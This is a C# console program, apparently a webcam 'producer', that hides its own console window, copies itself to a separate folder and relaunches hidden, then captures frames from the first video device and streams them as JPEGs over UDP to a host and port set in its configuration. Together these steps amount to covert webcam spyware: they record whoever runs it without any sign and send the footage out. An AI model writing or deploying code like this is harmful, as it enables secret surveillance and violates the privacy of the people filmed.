using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using AForge.Video;
using AForge.Video.DirectShow;

namespace Producer
{
    class Program
    {
        public static int SW_HIDE = 5;
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);



        private static IPEndPoint consumerEndPoint;

        public static UdpClient udpClient = new UdpClient();

        static void Main(string[] args)
        {
            var consumerIp = ConfigurationManager.AppSettings.Get("consumerIp");
            var consumerPort = int.Parse(ConfigurationManager.AppSettings.Get("consumerPort"));
            consumerEndPoint = new IPEndPoint(IPAddress.Parse(consumerIp), consumerPort);
            if (args.Length > 0 && args[0].Equals("hide"))
            {
                consumerPort=9909;
                SW_HIDE = 0;
            }
            else
            {
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                string path = Directory.GetCurrentDirectory();
                string stop = "/stop";
               
               
                CopyDirectoriesAndFiles(path, stop);
                //Process.Start(stop + "/Producer.exe");
                var p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/k " + stop + "/Producer.exe" + " hide";
                p.Start();
                SW_HIDE = 0;
                
            }
            

            Console.WriteLine($"consumer : {consumerEndPoint}");
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += VideoSource_NewFrame;
            videoSource.Start();




            ShowWindow(GetConsoleWindow(), SW_HIDE);
           
        }

        private static void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            var bmp = new Bitmap(eventArgs.Frame, 800, 600);
            try
            {
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    var bytes = ms.ToArray();
                    udpClient.Send(bytes, bytes.Length, consumerEndPoint);
                }
            }
            catch (Exception)
            {
                throw;
            }
        }
        public static void CopyDirectoriesAndFiles(String RootDirectory, String DestinationDirectory)
        {
            if (!Directory.Exists(DestinationDirectory))
                Directory.CreateDirectory(DestinationDirectory);

            DirectoryInfo dirInfo = new DirectoryInfo(RootDirectory);
            DirectoryInfo[] dirInfos = dirInfo.GetDirectories();

            FileInfo[] fileInfos = dirInfo.GetFiles();
            for (int i = 0; i < fileInfos.Length; i++)
            {
                try { File.Copy(fileInfos[i].FullName, Path.Combine(DestinationDirectory, fileInfos[i].Name)); }
                catch (IOException ioExc) { Console.WriteLine(ioExc.Message); }

            }

            for (int i = 0; i < dirInfos.Length; i++)
            {
                try { Directory.CreateDirectory(Path.Combine(DestinationDirectory, dirInfos[i].Name)); }
                catch (IOException ioExc) { Console.WriteLine(ioExc.Message); }
                CopyDirectoriesAndFiles(dirInfos[i].FullName, Path.Combine(DestinationDirectory, dirInfos[i].Name));
            }
        }
    }
}